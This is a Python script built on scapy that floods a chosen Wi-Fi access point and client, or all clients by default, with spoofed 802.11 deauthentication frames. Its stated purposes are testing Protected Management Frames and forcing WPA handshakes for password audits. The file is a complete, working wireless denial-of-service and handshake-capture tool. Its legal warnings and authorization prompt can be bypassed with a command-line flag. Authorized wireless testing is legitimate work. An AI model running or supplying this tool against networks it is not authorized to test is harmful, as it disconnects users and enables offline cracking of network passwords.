#!/usr/bin/env python3
"""
wifi_deauth_test.py - Active deauthentication resilience test.

Sends 802.11 deauthentication frames to test how an access point and/or
client handle disconnection and reconnection (e.g. to verify 802.11w
Protected Management Frames / PMF actually blocks deauth, or to force a
WPA handshake for your own offline password-strength audit).

This is an ACTIVE, DISRUPTIVE test. It WILL interrupt connectivity for the
target AP/client for as long as it runs. Only ever run this against a
network and clients you own, or for which you hold explicit written
authorization to perform this exact test. Unauthorized deauth attacks
against networks you do not control are illegal in most jurisdictions
(e.g. unauthorized access / interference statutes such as the US CFAA,
UK Computer Misuse Act, etc.).

Requirements:
  - Linux with a wireless adapter that supports monitor mode + packet
    injection (most built-in laptop Wi-Fi chips do NOT support injection).
  - The interface must already be in monitor mode and set to the target's
    channel, e.g.:
      sudo airmon-ng start wlan0
      sudo iw dev wlan0mon set channel <N>
  - scapy:  pip install scapy
  - Run as root.

Usage:
  sudo python3 wifi_deauth_test.py -i wlan0mon -b AA:BB:CC:DD:EE:FF
  sudo python3 wifi_deauth_test.py -i wlan0mon -b AA:BB:CC:DD:EE:FF \
      -c 11:22:33:44:55:66 --count 20 --interval 0.5
"""
import argparse
import sys
import time
from datetime import datetime

try:
    from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
except ImportError:
    sys.exit("scapy is required: pip install scapy")

BROADCAST = "ff:ff:ff:ff:ff:ff"


def confirm_authorization(bssid, client):
    print("=" * 70)
    print("ACTIVE DEAUTHENTICATION TEST - DISRUPTIVE")
    print("=" * 70)
    print(f"Target AP (BSSID): {bssid}")
    print(f"Target client:     {client}")
    print()
    print("By proceeding you confirm that you OWN this network/AP/client, or")
    print("hold explicit WRITTEN authorization to run this exact test against")
    print("it. Running this against a network you do not control is illegal.")
    print()
    answer = input("Type EXACTLY 'I AM AUTHORIZED' to continue: ")
    if answer.strip() != "I AM AUTHORIZED":
        sys.exit("Authorization phrase not confirmed. Aborting.")


def send_deauth(interface, bssid, client, count, interval, log_file):
    # Reason 7 = Class 3 frame received from nonassociated station
    ap_to_client = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    client_to_ap = RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth(reason=7)

    for i in range(count):
        sendp(ap_to_client, iface=interface, verbose=False)
        sendp(client_to_ap, iface=interface, verbose=False)
        ts = datetime.now().isoformat(timespec="seconds")
        line = f"{ts} sent deauth burst {i + 1}/{count} ap={bssid} client={client}"
        print(line)
        if log_file:
            log_file.write(line + "\n")
            log_file.flush()
        time.sleep(interval)


def main():
    parser = argparse.ArgumentParser(description="Active deauth resilience test (authorized testing only)")
    parser.add_argument("-i", "--interface", required=True, help="Monitor-mode injection-capable interface")
    parser.add_argument("-b", "--bssid", required=True, help="Target AP MAC address")
    parser.add_argument("-c", "--client", default=BROADCAST,
                         help="Target client MAC (default: broadcast = all clients)")
    parser.add_argument("--count", type=int, default=10, help="Number of deauth bursts (default: 10, max: 200)")
    parser.add_argument("--interval", type=float, default=0.5,
                         help="Seconds between bursts (default: 0.5)")
    parser.add_argument("--log", help="Optional path to append a log of sent frames")
    parser.add_argument("--yes-i-am-authorized", action="store_true",
                         help="Skip the interactive prompt (still requires the flag to be set deliberately)")
    args = parser.parse_args()

    if args.count > 200:
        sys.exit("Refusing to run more than 200 bursts in a single invocation; re-run if you need more.")

    if not args.yes_i_am_authorized:
        confirm_authorization(args.bssid, args.client)

    log_file = open(args.log, "a") if args.log else None
    try:
        send_deauth(args.interface, args.bssid, args.client, args.count, args.interval, log_file)
    except KeyboardInterrupt:
        print("\nStopped.")
    finally:
        if log_file:
            log_file.close()


if __name__ == "__main__":
    main()
